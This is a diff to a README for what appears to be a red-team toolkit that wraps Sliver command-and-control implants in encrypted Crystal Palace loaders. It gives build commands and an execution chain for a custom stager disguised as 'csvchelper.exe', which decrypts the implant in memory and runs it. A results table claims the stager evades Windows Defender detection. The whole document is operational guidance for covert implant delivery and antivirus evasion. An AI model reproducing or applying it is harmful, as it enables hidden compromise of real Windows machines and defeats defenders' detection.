@@ -28,7 +28,7 @@ The Sliver implant DLL (or any post-ex DLL) is XOR-masked inside the PICO and on
 
 ### A — Implant evasion (PRIMARY)
 
-The raw Sliver implant DLL is never executed directly on target. Instead it is wrapped with Crystal Palace into a PICO and delivered together with a stager (`run.x64.exe` from the Crystal Palace demo, BSD).
+The raw Sliver implant DLL is never executed directly on target. Instead it is wrapped with Crystal Palace into a PICO, AES-256-CBC encrypted, and delivered with a custom stager (~17 KB) that decrypts and executes it in memory.
 
 ```
 sliver-server generate --format shared → impl.dll
@@ -37,13 +37,15 @@ sliver-server generate --format shared → impl.dll
 generate-implant.sh --dll impl.dll → sliver.crystal.bin  (~110 KB PICO)
         │
         ▼
-bundle-implant.sh                  → drop.zip            (PICO + stager + README)
+bundle-stager.sh                   → csvchelper.exe (~17 KB, no embedded payload)
+                                   → payload.dat    (~36 MB AES-256-CBC ciphertext)
         │
-        ▼ deliver to target
+        ▼ deliver BOTH files to same directory on target
         ▼
-Windows VM: run.x64.exe sliver.crystal.bin
+Windows VM: csvchelper.exe
         │
-        ▼ Crystal Palace loader runs
+        ▼ BCrypt AES-256-CBC decrypt payload.dat → PICO in RW memory
+        ▼ VirtualProtect(RX) → CreateThread → Crystal Palace entry
         ▼ register .pdata → TLS callbacks → DllMain → StartW() → beacon goroutine → HTTP session
 ```
 
@@ -87,9 +89,11 @@ crystal-kit-sliver/
     ├── extension.json           Sliver Extension manifest
     ├── generate.sh              Wrap a post-ex DLL  → PICO (Use case B)
     ├── generate-implant.sh      Wrap a Sliver DLL   → PICO (Use case A)
-    ├── bundle-implant.sh        Bundle PICO + stager into drop.zip
+    ├── bundle-implant.sh        Bundle PICO + Crystal Palace demo stager into drop.zip (legacy)
+    ├── bundle-stager.sh         Build custom stager: csvchelper.exe + payload.dat (primary)
     ├── pack-extension.sh        Pack DLL + manifest into Sliver Extension tarball
     ├── Makefile                 make objects / package / clean
+    ├── stager/                  Custom stager sources (AES-256-CBC, asInvoker manifest)
     └── wrapper/                 crystal-loader.c (BOF-compat DLL wrapper)
 
 docs/
@@ -118,12 +122,13 @@ make -C crystal-kit-sliver/postex-loader all
 make -C crystal-kit-sliver/sliver-glue/wrapper all
 make -C crystal-kit-sliver/sliver-glue/wrapper smoketest
 
-# 4. Use case A — wrap a Sliver implant
+# 4. Use case A — wrap a Sliver implant and build the stager
 ./crystal-kit-sliver/sliver-glue/generate-implant.sh --dll /path/to/sliver-impl.dll \
    crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin
-./crystal-kit-sliver/sliver-glue/bundle-implant.sh \
+./crystal-kit-sliver/sliver-glue/bundle-stager.sh \
    crystal-kit-sliver/sliver-glue/build/sliver.crystal.bin \
-   crystal-kit-sliver/sliver-glue/build/drop.zip
+   crystal-kit-sliver/sliver-glue/build/csvchelper.exe
+# → produces build/csvchelper.exe + build/payload.dat (deliver both to target)
 
 # 5. Use case B — wrap a post-ex DLL (postex.sh handles naming and prints the sliver command)
 ./crystal-kit-sliver/sliver-glue/postex.sh /path/to/postex.dll
@@ -150,8 +155,8 @@ See `docs/RUNBOOK.md` for the full operator procedure (Sliver install, listener 
 | End-to-end PICO build (Use case B) | OK | 111 KB PICO produced via `postex-loader/loader.spec` |
 | Sliver Extension wrapper DLL builds | OK | 114 KB PE32+ exporting `go` symbol |
 | Extension tarball packs correctly | OK | 37 KB tarball validated with `tar -tzf` |
-| Operator drop bundle (PICO + stager) | OK | 182 KB zip with `run.x64.exe` + PICO + README |
-| Runtime execution on Windows (Use case A) | OK | Sliver session established on Windows 10 x64 FLARE-VM via `run.x64.exe sliver-crystal.bin` |
+| Custom stager build (two-file delivery) | OK | `bundle-stager.sh` → `csvchelper.exe` (17 KB, entropy 4.784) + `payload.dat` (AES-256-CBC) |
+| Runtime execution on Windows (Use case A) | OK | Sliver session established on Windows 10 x64 FLARE-VM; stager passes Defender (Wacatac.B!ml + ZomBytes.B) |
 | Runtime execution on Windows (Use case B) | OK | `crystal --payload C:/path/file.pico.bin` — new Sliver session established via post-ex PICO; arg format verified as `type:string`, forward slash path |
 | `crystal-exec` command | OK | Shell command output returned to operator via pipe; PICO embedded in extension DLL, no upload required |
 
